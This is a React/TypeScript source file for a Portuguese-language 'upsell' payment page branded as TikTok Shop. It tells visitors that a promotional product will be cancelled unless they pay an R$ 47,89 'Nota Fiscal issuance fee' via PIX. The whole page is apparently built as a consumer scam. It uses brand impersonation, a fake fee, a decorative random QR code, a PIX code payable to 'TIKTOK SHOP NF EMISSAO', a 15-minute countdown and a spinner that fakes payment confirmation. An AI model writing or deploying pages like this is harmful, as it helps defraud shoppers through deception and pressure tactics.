import { useState, useEffect } from "react";
import { X, Copy, Clock, Loader2 } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const Upsell1Page = () => {
  const [showModal, setShowModal] = useState(false);
  const [timeLeft, setTimeLeft] = useState(900); // 15 minutos

  // Placeholder PIX code para upsell
  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP NF EMISSAO6009SAO PAULO62070503***6304";

  useEffect(() => {
    if (!showModal) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [showModal]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast.success("Código PIX copiado!");
    } catch {
      toast.error("Erro ao copiar código");
    }
  };

  const handleOpenModal = () => {
    setTimeLeft(900); // Reset timer
    setShowModal(true);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com Logo TikTok Shop */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* Mensagem de Parabéns */}
          <div className="text-center mb-6">
            <h1 className="text-2xl md:text-3xl font-extrabold text-[#1a1a2e] mb-2">
              Parabéns!
            </h1>
            <p className="text-gray-600 text-base leading-relaxed">
              Você acabou de garantir seu produto promocional através da TikTok Shop! 
              Para concluir, basta realizar o pagamento da emissão da Nota Fiscal.
            </p>
          </div>

          {/* Card NF-e */}
          <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
            <div className="text-center">
              <p className="text-sm text-gray-500 font-medium uppercase tracking-wide mb-1">
                NF-e (Taxa de Emissão de NF)
              </p>
              <p className="text-4xl font-bold text-gray-900 mb-2">
                R$ 47,89
              </p>
              <p className="text-sm text-gray-500">
                Taxa única para emissão da NF
              </p>
            </div>
          </div>

          {/* Botão Efetuar Pagamento */}
          <Button
            onClick={handleOpenModal}
            className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
          >
            Efetuar pagamento da Taxa
          </Button>

          {/* Card Aviso */}
          <div className="bg-white rounded-2xl shadow-lg p-6 mt-6">
            <p className="text-gray-700 text-sm leading-relaxed">
              <strong>Atenção:</strong> Para receber seu produto do TikTok Shop, é necessário pagar a 
              NF-e (Taxa de Emissão de Nota Fiscal). Sem o pagamento, o envio não será 
              autorizado e o pedido será cancelado.
            </p>
          </div>

          {/* Logos SlimHealth + CIMED */}
          <div className="flex items-center justify-center gap-3 mt-8 mb-8">
            <img 
              src={slimhealthLogo} 
              alt="SlimHealth" 
              className="h-7 object-contain opacity-70"
            />
            <span className="text-lg font-bold text-muted-foreground">+</span>
            <img 
              src={cimedLogo} 
              alt="CIMED" 
              className="h-5 object-contain opacity-70"
            />
          </div>
        </div>
      </div>

      {/* Modal de Pagamento One-Click */}
      {showModal && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
          onClick={() => setShowModal(false)}
        >
          <div 
            className="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Header do Modal */}
            <div className="bg-white border-b border-gray-100 px-4 py-3 flex items-center justify-between">
              <div className="w-8" /> {/* Spacer */}
              <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
              <button 
                onClick={() => setShowModal(false)}
                className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            {/* Conteúdo do Modal */}
            <div className="p-6">
              {/* Título e Valor */}
              <div className="text-center mb-4">
                <p className="text-gray-500 text-sm font-medium">Taxa de Nota Fiscal</p>
                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 47,89</p>
              </div>

              {/* QR Code */}
              <div className="flex justify-center mb-4">
                <div className="w-48 h-48 bg-gray-100 border-2 border-gray-200 rounded-lg flex items-center justify-center">
                  <div className="w-36 h-36 bg-gray-200 rounded grid grid-cols-6 grid-rows-6 gap-0.5 p-2">
                    {Array.from({ length: 36 }).map((_, i) => (
                      <div 
                        key={i} 
                        className={`rounded-sm ${Math.random() > 0.4 ? 'bg-gray-800' : 'bg-white'}`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              {/* Botão Copiar */}
              <Button
                onClick={handleCopyPix}
                className="w-full bg-rose-500 hover:bg-rose-600 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
              >
                <Copy className="w-5 h-5" />
                Copiar código PIX
              </Button>

              {/* Timer de Expiração */}
              <div className="flex items-center justify-center gap-2 mt-4 text-amber-600">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">
                  O PIX expira em: <span className="font-bold">{formatTime(timeLeft)}</span>
                </span>
              </div>

              {/* Aguardando Confirmação */}
              <div className="flex items-center justify-center gap-2 mt-2 text-amber-600">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span className="text-sm">Aguardando confirmação...</span>
              </div>

              {/* Código PIX truncado */}
              <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
                {pixCode}
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell1Page;
